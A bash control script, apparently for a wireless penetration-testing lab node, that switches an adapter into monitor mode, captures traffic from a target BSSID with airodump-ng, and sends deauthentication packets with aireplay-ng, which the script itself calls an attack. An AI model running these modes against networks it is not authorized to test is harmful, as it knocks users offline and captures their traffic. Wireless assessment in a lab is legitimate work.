#!/bin/bash
# ARES Lab Server Control Script - Wireless Assessment Node
# Hardware: TP-Link AC600 (RTL8811AU)
# Interface: wlx3460f9927ab3

readonly RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m' NC='\033[0m'

log_info() { echo -e "${BLUE}[ARES INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[ARES SUCCESS]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[ARES WARNING]${NC} $1"; }
log_error() { echo -e "${RED}[ARES ERROR]${NC} $1"; }

# Primary interface (currently connected to network)
MAIN_IF="wlx3460f9927ab3"
MONITOR_IF="mon0"
PHY="phy0"

# Check if monitor interface exists
check_monitor() {
    iw dev | grep -q "^\s*Interface ${MONITOR_IF}"
}

case ${ARES_MODE} in
    monitor)
        log_info "Setting up monitor mode on channel ${TARGET_CHANNEL:-6}"
        
        # Check if already in monitor
        if check_monitor; then
            log_warning "Monitor interface ${MONITOR_IF} already exists"
            sudo ip link set ${MONITOR_IF} down 2>/dev/null
            sudo iw dev ${MONITOR_IF} del 2>/dev/null
        fi
        
        # Create virtual monitor interface
        log_info "Creating virtual monitor interface ${MONITOR_IF}"
        sudo iw phy ${PHY} interface add ${MONITOR_IF} type monitor
        
        if [ $? -ne 0 ]; then
            log_error "Failed to create monitor interface"
            exit 1
        fi
        
        # Bring up
        sudo ip link set ${MONITOR_IF} up
        sudo iw dev ${MONITOR_IF} set channel ${TARGET_CHANNEL:-6}
        
        log_success "Monitor mode active on ${MONITOR_IF}, channel ${TARGET_CHANNEL:-6}"
        log_success "Production interface (${MAIN_IF}) still running"
        ;;
        
    capture)
        log_info "Starting packet capture"
        
        if ! check_monitor; then
            log_error "Monitor interface ${MONITOR_IF} does not exist. Run 'monitor' mode first."
            exit 1
        fi
        
        if [ -z "${TARGET_BSSID}" ]; then
            log_error "TARGET_BSSID not set"
            exit 1
        fi
        
        mkdir -p /tmp/ares_captures
        CAPTURE_FILE="/tmp/ares_captures/capture_$(date +%Y%m%d_%H%M%S)"
        
        log_info "Target BSSID: ${TARGET_BSSID}"
        log_info "Target Channel: ${TARGET_CHANNEL:-6}"
        log_info "Capture file: ${CAPTURE_FILE}"
        
        sudo airodump-ng --bssid ${TARGET_BSSID} -c ${TARGET_CHANNEL:-6} -w ${CAPTURE_FILE} ${MONITOR_IF} &
        
        AIRODUMP_PID=$!
        log_success "Capture started (PID: ${AIRODUMP_PID})"
        echo ${AIRODUMP_PID} > /tmp/ares_airodump.pid
        ;;
        
    deauth)
        log_info "Starting deauth attack"
        
        if ! check_monitor; then
            log_error "Monitor interface ${MONITOR_IF} does not exist"
            exit 1
        fi
        
        if [ -z "${TARGET_BSSID}" ]; then
            log_error "TARGET_BSSID not set"
            exit 1
        fi
        
        DEAUTH_COUNT=${DEAUTH_COUNT:-10}
        log_info "Target BSSID: ${TARGET_BSSID}"
        log_info "Deauth packets: ${DEAUTH_COUNT}"
        
        sudo aireplay-ng --deauth ${DEAUTH_COUNT} -a ${TARGET_BSSID} --ignore-negative-one ${MONITOR_IF}
        log_success "Deauth attack completed"
        ;;
        
    normal)
        log_info "Restoring normal operation"
        
        sudo killall airodump-ng 2>/dev/null
        sudo killall aireplay-ng 2>/dev/null
        
        if check_monitor; then
            log_info "Removing monitor interface ${MONITOR_IF}"
            sudo ip link set ${MONITOR_IF} down 2>/dev/null
            sudo iw dev ${MONITOR_IF} del 2>/dev/null
        fi
        
        log_success "Normal operation restored"
        ;;
        
    status)
        log_info "ARES Lab Server Status"
        echo ""
        echo "=== Wireless Interfaces ==="
        iw dev | grep -E "Interface|type|channel" | sed 's/^/  /'
        echo ""
        
        echo "=== Monitor Interface ==="
        if check_monitor; then
            echo -e "  ${GREEN}✓${NC} ${MONITOR_IF} exists"
            iw dev ${MONITOR_IF} info | grep channel | sed 's/^/  /'
        else
            echo -e "  ${RED}✗${NC} ${MONITOR_IF} does not exist"
        fi
        echo ""
        
        echo "=== Running Processes ==="
        if pgrep airodump-ng > /dev/null; then
            echo -e "  ${GREEN}✓${NC} airodump-ng is running"
            ps aux | grep airodump-ng | grep -v grep | sed 's/^/    /'
        else
            echo -e "  ${RED}✗${NC} airodump-ng is not running"
        fi
        echo ""
        
        echo "=== Capture Files ==="
        if [ -d /tmp/ares_captures ]; then
            CAPTURE_COUNT=$(ls /tmp/ares_captures/*.cap 2>/dev/null | wc -l)
            if [ ${CAPTURE_COUNT} -gt 0 ]; then
                echo -e "  ${GREEN}✓${NC} ${CAPTURE_COUNT} capture file(s) found"
                ls -lh /tmp/ares_captures/*.cap 2>/dev/null | sed 's/^/    /'
            else
                echo -e "  ${YELLOW}⚠${NC} No capture files found"
            fi
        else
            echo -e "  ${RED}✗${NC} Capture directory does not exist"
        fi
        echo ""
        
        echo "=== Storage ==="
        df -h /home | sed 's/^/  /'
        echo ""
        
        echo "=== Memory ==="
        free -h | sed 's/^/  /'
        ;;
        
    cleanup)
        log_info "Cleaning up ARES artifacts"
        sudo killall airodump-ng aireplay-ng 2>/dev/null
        
        if check_monitor; then
            sudo ip link set ${MONITOR_IF} down 2>/dev/null
            sudo iw dev ${MONITOR_IF} del 2>/dev/null
        fi
        
        rm -f /tmp/ares_airodump.pid
        log_success "Cleanup complete"
        ;;
        
    *)
        log_error "Invalid ARES_MODE: ${ARES_MODE}"
        echo ""
        echo "Valid modes: monitor, capture, deauth, normal, status, cleanup"
        exit 1
        ;;
esac
